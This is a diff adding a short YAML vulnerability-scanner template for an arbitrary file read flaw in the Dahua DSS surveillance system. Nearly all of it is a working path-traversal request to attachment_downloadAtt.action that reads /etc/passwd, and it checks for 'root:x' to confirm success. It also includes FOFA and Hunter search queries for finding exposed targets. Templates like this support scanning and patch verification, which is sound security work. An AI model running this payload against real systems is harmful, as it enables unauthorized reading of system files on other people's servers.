@@ -1,0 +1,15 @@
+name: dahua-DSS-fileread
+rules:
+  - method: GET
+    path: /portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd
+    headers:
+    body: 
+    expression:                          
+      status_code: 200                   
+      response_header:   
+      response_body: root:x
+detail:
+  description: "大华DSS Digital Surveillance System系统attachment_downloadAtt.action存在任意文件读取漏洞"
+  search: 
+    fofa: app=dahua-DSS
+    鹰图: web.title=="DSS"
